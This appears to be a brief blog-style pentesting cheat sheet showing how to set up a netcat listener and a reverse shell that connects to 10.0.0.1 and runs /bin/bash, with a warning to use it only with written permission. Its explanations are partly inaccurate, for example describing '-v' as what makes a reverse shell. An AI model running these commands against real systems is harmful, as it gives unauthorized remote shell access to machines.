---
title: use netcat for pentesting
date: 2022-11-07
---

## Warning! Use for pentesting only, and only with targets that you have a written get out of jail free card and/or written permission for.

### listen for a connection:
> (you could i.e. use this in a script and get a webrequest with a special agent using curl and then make a cronjob out of grepping the nginx acces log associated with your vhost, which shows the ip, then you try to connect.)

```sh
nc -lv 1203
```

explaination: nc is the command to call our program; netcat. -lv implies that we want to listen for shells; 1203 is the port we will use to listen for shells

### open connection on remote host:

```sh
nc -v 10.0.0.1 1203 -e /bin/bash
```

explaination: nc is the command to call our program; netcat once again. -v tells it that we want to make a reverse shell; 10.0.0.1 is the ip of the listener (the above command); 1203 is once again the port to connect to. /bin/bash is the program to execute, in this case a shell, but you can alo pipe output of a program or file to the reverse shell
